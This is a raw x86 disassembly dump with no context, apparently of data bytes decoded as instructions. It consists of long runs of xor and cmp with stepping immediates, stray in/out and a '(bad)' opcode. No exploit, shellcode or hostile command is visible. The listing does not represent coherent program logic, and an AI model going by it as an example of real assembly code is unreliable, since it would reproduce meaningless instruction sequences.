  425b51:	lahf   
  425b52:	xor    BYTE PTR [edx-0x32cf41d0],dh
  425b58:	xor    dl,ah
  425b5a:	xor    bh,ch
  425b5c:	xor    ah,bh
  425b5e:	xor    BYTE PTR [edi],al
  425b60:	xor    DWORD PTR [ebx],ecx
  425b62:	xor    DWORD PTR [ebx],edx
  425b64:	xor    DWORD PTR [edi],edx
  425b66:	xor    DWORD PTR [ebx],esp
  425b68:	xor    DWORD PTR [edi],ebp
  425b6a:	xor    DWORD PTR [ebx],esi
  425b6c:	xor    DWORD PTR [edx],edi
  425b6e:	xor    DWORD PTR [ebx+0x31],eax
  425b71:	dec    ecx
  425b72:	xor    DWORD PTR [edi+0x31],ecx
  425b75:	pusha  
  425b76:	xor    DWORD PTR [ecx+esi*1+0x72],ebp
  425b7a:	xor    DWORD PTR [ecx-0x72ce78cf],eax
  425b80:	xor    DWORD PTR [ebx-0x55ce5ecf],ebx
  425b86:	xor    DWORD PTR [ecx+esi*1+0x32ee31b8],esi
  425b8d:	repnz xor bh,cl
  425b90:	xor    bh,ch
  425b92:	xor    al,BYTE PTR [esi]
  425b94:	xor    ecx,DWORD PTR [edx]
  425b96:	xor    edi,DWORD PTR [eax+0x35]
  425b99:	jl     0x425bd0
  425b9b:	dec    edx
  425b9c:	cmp    eax,0x3e883d54
  425ba1:	nop
  425ba2:	ds cwde 
  425ba4:	fstp   TBYTE PTR ds:[edi]
  425ba7:	add    BYTE PTR [eax],al
  425ba9:	add    BYTE PTR [eax+0x0],dh
  425bac:	add    BYTE PTR [eax+eax*1+0x0],ch
  425bb0:	add    BYTE PTR ds:0x7d327331,ch
  425bb6:	xor    al,BYTE PTR [edx+esi*1+0x3296328a]
  425bbd:	pushf  
  425bbe:	xor    ah,BYTE PTR [edx-0x42cd50ce]
  425bc4:	xor    cl,dl
  425bc6:	xor    al,BYTE PTR [ebp+esi*1+0x5d]
  425bca:	xor    eax,0x3589356a
  425bcf:	xchg   ebp,eax
  425bd0:	xor    eax,0x35a2359c
  425bd5:	scas   al,BYTE PTR es:[edi]
  425bd6:	xor    eax,0x35ba35b4
  425bdb:	int3   
  425bdc:	xor    eax,0x370f35d0
  425be1:	sbb    esi,DWORD PTR [edi]
  425be3:	daa    
  425be4:	aaa    
  425be5:	sub    esi,DWORD PTR [edi]
  425be7:	xor    esi,DWORD PTR [edi]
  425be9:	jbe    0x425c23
  425beb:	xchg   BYTE PTR [eax],bh
  425bed:	cwde   
  425bee:	cmp    BYTE PTR [esi-0x4ac754c8],bl
  425bf4:	cmp    BYTE PTR [eax+edi*1+0x38d638c2],bh
  425bfb:	in     al,dx
  425bfc:	cmp    dl,dh
  425bfe:	cmp    BYTE PTR [edi],al
  425c00:	cmp    DWORD PTR [ecx+edi*1],ecx
  425c03:	push   ecx
  425c04:	cmp    bl,BYTE PTR [ebx+0x3a]
  425c07:	push   0x813a7b3a
  425c0c:	cmp    cl,BYTE PTR [esi-0x62c56ac6]
  425c12:	cmp    ah,BYTE PTR [edx+edi*1+0x8000]
  425c19:	sbb    BYTE PTR [edx],al
  425c1b:	add    BYTE PTR [eax],al
  425c1d:	mov    dh,0x30
  425c1f:	mov    esp,0xcb30c230
  425c24:	xor    dl,dl
  425c26:	xor    ah,ch
  425c28:	xor    al,bh
  425c2a:	xor    BYTE PTR [edx],al
  425c2c:	xor    DWORD PTR [ecx],ecx
  425c2e:	xor    DWORD PTR [edi],ecx
  425c30:	xor    DWORD PTR [ebx],ebx
  425c32:	xor    DWORD PTR [ecx],esp
  425c34:	xor    DWORD PTR [edi],esp
  425c36:	xor    esp,ebp
  425c38:	xor    esi,edi
  425c3a:	xor    DWORD PTR [eax],ecx
  425c3c:	xor    dl,BYTE PTR ds:0x2b322532
  425c42:	xor    bh,BYTE PTR [eax]
  425c44:	xor    bh,BYTE PTR [edi]
  425c46:	xor    al,BYTE PTR [ebp+0x32]
  425c49:	dec    esp
  425c4a:	xor    bl,BYTE PTR [esi+0x33]
  425c4d:	xor    ebp,DWORD PTR fs:[esi+0x33]
  425c51:	je     0x425c86
  425c53:	js     0x425c88
  425c55:	xor    BYTE PTR [ebx],0x90
  425c58:	xor    edx,DWORD PTR [ebx+esi*1+0x33a533a1]
  425c5f:	lods   al,BYTE PTR ds:[esi]
  425c60:	xor    edi,DWORD PTR [ebx-0x37cc3dcd]
  425c66:	xor    edx,ebp
  425c68:	xor    esp,edi
  425c6a:	xor    ebp,ebp
  425c6c:	xor    edi,edx
  425c6e:	xor    eax,DWORD PTR [ecx]
  425c70:	xor    al,0xc
  425c72:	xor    al,0x1b
  425c74:	xor    al,0x25
  425c76:	xor    al,0x2a
  425c78:	xor    al,0x30
  425c7a:	xor    al,0x36
  425c7c:	xor    al,0x48
  425c7e:	xor    al,0x57
  425c80:	xor    al,0x66
  425c82:	xor    al,0x75
  425c84:	xor    al,0x84
  425c86:	xor    al,0x88
  425c88:	xor    al,0x98
  425c8a:	xor    al,0xc7
  425c8c:	xor    al,0xd0
  425c8e:	xor    al,0xdc
  425c90:	xor    al,0xe6
  425c92:	xor    al,0xf3
  425c94:	xor    al,0x5
  425c96:	xor    eax,0x3517350b
  425c9b:	sbb    eax,0x2b352535
  425ca0:	xor    eax,0x353b3536
  425ca5:	inc    ecx
  425ca6:	xor    eax,0x35573550
  425cab:	pop    ebp
  425cac:	xor    eax,0x3586356a
  425cb1:	xchg   edx,eax
  425cb2:	xor    eax,0x359e3598
  425cb7:	scas   al,BYTE PTR es:[edi]
  425cb8:	xor    eax,0x35c735bb
  425cbd:	into   
  425cbe:	xor    eax,0x35e735d4
  425cc3:	in     eax,dx
  425cc4:	xor    eax,0x360035f3
  425cc9:	or     al,0x36
  425ccb:	adc    esi,DWORD PTR [esi]
  425ccd:	sbb    DWORD PTR [esi],esi
  425ccf:	sub    esi,DWORD PTR [esi]
  425cd1:	xor    DWORD PTR [esi],esi
  425cd3:	ds ss inc ebp
  425cd6:	ss dec ebx
  425cd8:	ss pop eax
  425cda:	ss fs ss push 0x36
  425cdf:	jo     0x425d17
  425ce1:	jnp    0x425d19
  425ce3:	xchg   DWORD PTR [esi],esi
  425ce5:	mov    esi,DWORD PTR [esi]
  425ce7:	xchg   edx,eax
  425ce8:	ss pushf 
  425cea:	ss test eax,0xcb36c536
  425cf0:	fdiv   DWORD PTR ss:[esi]
  425cf3:	fbstp  TBYTE PTR [esi]
  425cf5:	in     eax,0x36
  425cf7:	in     al,dx
  425cf8:	div    DWORD PTR ss:[esi]
  425cfb:	add    DWORD PTR [edi],esi
  425cfd:	or     BYTE PTR [edi],dh
  425cff:	push   cs
  425d00:	aaa    
  425d01:	and    eax,0x38372b37
  425d06:	aaa    
  425d07:	aas    
  425d08:	aaa    
  425d09:	inc    ebp
  425d0a:	aaa    
  425d0b:	push   edi
  425d0c:	aaa    
  425d0d:	pop    ebx
  425d0e:	aaa    
  425d0f:	data16 aaa 
  425d11:	imul   esi,DWORD PTR [edi],0x76
  425d14:	aaa    
  425d15:	xor    DWORD PTR [edi],0xffffffa7
  425d18:	aaa    
  425d19:	mov    cl,0x37
  425d1b:	mov    ebx,0xc837c237
  425d20:	aaa    
  425d21:	aam    0x37
  425d23:	out    0x37,eax
  425d25:	in     eax,dx
  425d26:	aaa    
  425d27:	stc    
  425d28:	aaa    
  425d29:	or     BYTE PTR [eax],bh
  425d2b:	push   cs
  425d2c:	cmp    BYTE PTR [eax+edi*1],dl
  425d2f:	sbb    DWORD PTR [eax],edi
  425d31:	and    bh,BYTE PTR [eax]
  425d33:	sub    al,0x38
  425d35:	xor    bh,BYTE PTR [eax]
  425d37:	cmp    BYTE PTR ss:[esi],bh
  425d3a:	cmp    BYTE PTR [edx+0x38],cl
  425d3d:	data16 cmp BYTE PTR [eax+edi*1+0x7c],ch
  425d42:	cmp    BYTE PTR [edx-0x6cc773c8],al
  425d48:	cmp    BYTE PTR [ecx-0x48c74ec8],bl
  425d4e:	cmp    ah,al
  425d50:	cmp    dh,cl
  425d52:	cmp    bl,bl
  425d54:	cmp    bl,ch
  425d56:	cmp    cl,dh
  425d58:	cmp    BYTE PTR [eax],al
  425d5a:	cmp    DWORD PTR [edi],eax
  425d5c:	cmp    DWORD PTR ds:0x1f391439,ecx
  425d62:	cmp    DWORD PTR [eax],esi
  425d64:	cmp    DWORD PTR [edi],esi
  425d66:	cmp    DWORD PTR ds:0x5a394a39,edi
  425d6c:	cmp    DWORD PTR [eax+0x39],esp
  425d6f:	outs   dx,DWORD PTR ds:[esi]
  425d70:	cmp    DWORD PTR [esi+0x39],esi
  425d73:	cmp    DWORD PTR [ecx],0x39ab3990
  425d79:	mov    bl,0x39
  425d7b:	sar    BYTE PTR [ecx],0xd1
  425d7e:	cmp    edi,edx
  425d80:	cmp    ebp,ebx
  425d82:	cmp    edx,ebp
  425d84:	cmp    DWORD PTR [ecx],ecx
  425d86:	cmp    cl,BYTE PTR [edi]
  425d88:	cmp    bl,BYTE PTR [ebx]
  425d8a:	cmp    ah,BYTE PTR [ecx]
  425d8c:	cmp    ch,BYTE PTR [ebx]
  425d8e:	cmp    dh,BYTE PTR [ecx]
  425d90:	cmp    al,BYTE PTR [ebx+0x3a]
  425d93:	dec    ebx
  425d94:	cmp    dl,BYTE PTR [ebp+0x3a]
  425d97:	bound  edi,QWORD PTR [edx]
  425d99:	jle    0x425dd5
  425d9b:	test   BYTE PTR [edx],bh
  425d9d:	xchg   ebx,eax
  425d9e:	cmp    bl,BYTE PTR [edx-0x56c55dc6]
  425da4:	cmp    dh,BYTE PTR [edx+edi*1+0x3aca3ac3]
  425dab:	sar    BYTE PTR [edx],1
  425dad:	fnstsw WORD PTR [edx]
  425daf:	out    dx,eax
  425db0:	cmp    bh,bl
  425db2:	cmp    al,BYTE PTR [ecx]
  425db4:	cmp    ecx,DWORD PTR [ecx]
  425db6:	cmp    edi,DWORD PTR [ebx]
  425db8:	cmp    eax,DWORD PTR [ebp+0x3b]
  425dbb:	dec    esp
  425dbc:	cmp    edx,DWORD PTR [edx+0x3b]
  425dbf:	pop    esi
  425dc0:	cmp    esp,DWORD PTR [ebx+edi*1+0x6a]
  425dc4:	cmp    esi,DWORD PTR [edi+0x3b]
  425dc7:	jle    0x425e04
  425dc9:	test   BYTE PTR [ebx],bh
  425dcb:	xchg   ecx,eax
  425dcc:	cmp    ebx,DWORD PTR [ecx-0x4ac45dc5]
  425dd2:	cmp    edi,DWORD PTR [ebp-0x26c435c5]
  425dd8:	cmp    ebx,edi
  425dda:	cmp    ebp,edi
  425ddc:	cmp    edi,ecx
  425dde:	cmp    eax,DWORD PTR [eax]
  425de0:	cmp    al,0x6
  425de2:	cmp    al,0x21
  425de4:	cmp    al,0x2c
  425de6:	cmp    al,0x32
  425de8:	cmp    al,0x38
  425dea:	cmp    al,0x45
  425dec:	cmp    al,0x4c
  425dee:	cmp    al,0x52
  425df0:	cmp    al,0x69
  425df2:	cmp    al,0x75
  425df4:	cmp    al,0x86
  425df6:	cmp    al,0x8c
  425df8:	cmp    al,0x91
  425dfa:	cmp    al,0x9d
  425dfc:	cmp    al,0xa1
  425dfe:	cmp    al,0xa9
  425e00:	cmp    al,0xad
  425e02:	cmp    al,0xb5
  425e04:	cmp    al,0xcb
  425e06:	cmp    al,0xd8
  425e08:	cmp    al,0xe0
  425e0a:	cmp    al,0xed
  425e0c:	cmp    al,0xf3
  425e0e:	cmp    al,0x2
  425e10:	cmp    eax,0x3d153d0a
  425e15:	sbb    DWORD PTR ds:0x3d2d3d23,edi
  425e1b:	cmp    bh,BYTE PTR ds:0x3d653d5f
  425e21:	jno    0x425e60
  425e23:	ja     0x425e62
  425e25:	jg     0x425e64
  425e27:	test   DWORD PTR ds:0x3d8f,edi
  425e2d:	add    BYTE PTR [eax+0xb00000],dl
  425e33:	add    BYTE PTR [eax],al
  425e35:	cmp    al,0x30
  425e37:	xchg   ecx,eax
  425e38:	xor    al,dl
  425e3a:	xor    al,bl
  425e3c:	xor    ch,bl
  425e3e:	xor    BYTE PTR [ebx],cl
  425e40:	xor    DWORD PTR [ecx+esi*1],ebx
  425e43:	xor    DWORD PTR es:[esi],ebp
  425e46:	xor    DWORD PTR [esi],edi
  425e48:	xor    DWORD PTR [ecx+0x31],ebp
  425e4b:	jne    0x425e7e
  425e4d:	nop
  425e4e:	xor    DWORD PTR [edx+0x2931b531],ebx
  425e54:	xor    ch,BYTE PTR [esi]
  425e56:	xor    dh,BYTE PTR [edi+0x32]
  425e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e5a:	xor    dh,BYTE PTR [eax-0x41cd4bce]
  425e60:	xor    cl,al
  425e62:	xor    cl,bh
  425e64:	xor    dl,ch
  425e66:	xor    ah,ah
  425e68:	xor    ch,bh
  425e6a:	xor    dh,ch
  425e6c:	xor    al,BYTE PTR [edx]
  425e6e:	xor    ecx,DWORD PTR [ecx]
  425e70:	xor    ecx,DWORD PTR [edi]
  425e72:	xor    ebx,DWORD PTR [ecx-0x4bcb59cc]
  425e78:	xor    al,0xc0
  425e7a:	xor    al,0xe1
  425e7c:	xor    al,0xeb
  425e7e:	xor    al,0xf2
  425e80:	xor    al,0xf8
  425e82:	xor    al,0x7
  425e84:	xor    eax,0x3511350c
  425e89:	pop    ss
  425e8a:	xor    eax,0x352a351d
  425e8f:	ss xor eax,0x354c3545
  425e95:	push   edx
  425e96:	xor    eax,0x356b355f
  425e9b:	jl     0x425ed2
  425e9d:	xchg   ebp,eax
  425e9e:	xor    eax,0x35b135a2
  425ea3:	(bad)  
  425ea4:	xor    eax,0x35d835d4
  425ea9:	cmp    BYTE PTR [edi],dh
  425eab:	inc    esp
  425eac:	aaa    
  425ead:	push   esp
  425eae:	aaa    
  425eaf:	pop    edi
  425eb0:	aaa    
  425eb1:	push   0x74376e37
  425eb6:	aaa    
  425eb7:	xor    DWORD PTR [edi],0x37933787
  425ebd:	cdq    
  425ebe:	aaa    
  425ebf:	lahf   
  425ec0:	aaa    
  425ec1:	xor    bh,BYTE PTR [ebx]
  425ec3:	test   al,0x3c
  425ec5:	lods   al,BYTE PTR ds:[esi]
  425ec6:	cmp    al,0x23
  425ec8:	xor    edi,DWORD PTR ds:[esi]
  425ecb:	aas    
  425ecc:	ds dec esp
  425ece:	ds push esp
  425ed0:	ds fs outs dx,BYTE PTR ds:[esi]
  425ed4:	ds jnp 0x425f15
  425ed7:	sahf   
  425ed8:	mov    ds:0x3ea93e,eax
  425ede:	rol    BYTE PTR [eax],1
  425ee0:	add    BYTE PTR [eax],bl
  425ee2:	add    BYTE PTR [eax],al
  425ee4:	add    BYTE PTR [edi],bl
  425ee6:	cmp    ah,BYTE PTR [ebx]
  425ee8:	cmp    ah,BYTE PTR [edi]
  425eea:	cmp    ch,BYTE PTR [ebx]
  425eec:	cmp    ch,BYTE PTR [edi]
  425eee:	cmp    dh,BYTE PTR [ebx]
  425ef0:	cmp    dh,BYTE PTR [edi]
  425ef2:	cmp    bh,BYTE PTR [ebx]
  425ef4:	cmp    al,BYTE PTR [eax]
  425ef6:	and    BYTE PTR [edx],al
  425ef8:	add    BYTE PTR [eax],bl
  425efa:	add    BYTE PTR [eax],al
  425efc:	add    BYTE PTR [ecx-0x4ecd52ce],ch
  425f02:	xor    dh,BYTE PTR [ebp-0x42cd46ce]
  425f08:	xor    al,cl
  425f0a:	xor    al,ch
  425f0c:	xor    al,BYTE PTR [eax]
  425f0e:	inc    eax
  425f0f:	add    al,0x0
  425f11:	push   0x18000000
  425f16:	xor    BYTE PTR [eax+esi*1],bl
  425f19:	and    BYTE PTR [eax],dh
  425f1b:	mov    al,ds:0xa831a431
  425f20:	xor    DWORD PTR [ecx+esi*1+0x31b431b0],ebp
  425f27:	mov    eax,0xc031bc31
  425f2c:	xor    esp,eax
  425f2e:	xor    eax,edx
  425f30:	xor    esp,edx
  425f32:	xor    eax,ebx
  425f34:	xor    esp,ebx
  425f36:	xor    eax,esp
  425f38:	xor    esp,esp
  425f3a:	xor    eax,ebp
  425f3c:	xor    esp,ebp
  425f3e:	xor    eax,esi
  425f40:	xor    esp,esi
  425f42:	xor    DWORD PTR [eax],eax
  425f44:	xor    cl,BYTE PTR [edx+esi*1]
  425f47:	adc    al,0x32
  425f49:	sub    BYTE PTR [edx],dh
  425f4b:	pop    esp
  425f4c:	xor    ah,BYTE PTR [eax+0x32]
  425f4f:	je     0x425f83
  425f51:	lods   al,BYTE PTR ds:[esi]
  425f52:	xor    cl,BYTE PTR [eax+0x33]
  425f55:	sbb    BYTE PTR [eax+eiz*1],dh
  425f58:	xor    al,0x28
  425f5a:	xor    al,0x2c
  425f5c:	xor    al,0xd4
  425f5e:	xor    al,0xd8
  425f60:	xor    al,0xdc
  425f62:	xor    al,0xe0
  425f64:	xor    al,0xe4
  425f66:	xor    al,0xe8
  425f68:	xor    al,0xec
  425f6a:	xor    al,0xf0
  425f6c:	xor    al,0xf4
  425f6e:	xor    al,0xf8
  425f70:	xor    al,0xfc
  425f72:	xor    al,0x0
  425f74:	add    BYTE PTR [eax],al
  425f76:	jo     0x425f7c
  425f78:	add    BYTE PTR [eax],bl
  425f7a:	add    BYTE PTR [eax],al
  425f7c:	add    BYTE PTR [ecx+edi*1+0x39b439b0],ch
  425f83:	mov    eax,0xc039bc39
  425f88:	cmp    esp,eax
  425f8a:	cmp    eax,ecx
  425f8c:	cmp    DWORD PTR [eax],eax
  425f8e:	mov    al,ds:0x180004
  425f93:	add    BYTE PTR [eax],al
  425f95:	in     al,dx
  425f96:	ss lock ss hlt 
  425f9a:	ss clc 
  425f9c:	ss cld 
  425f9e:	add    BYTE PTR ss:[edi],dh
  425fa1:	add    al,0x37
  425fa3:	or     BYTE PTR [edi],dh
	...
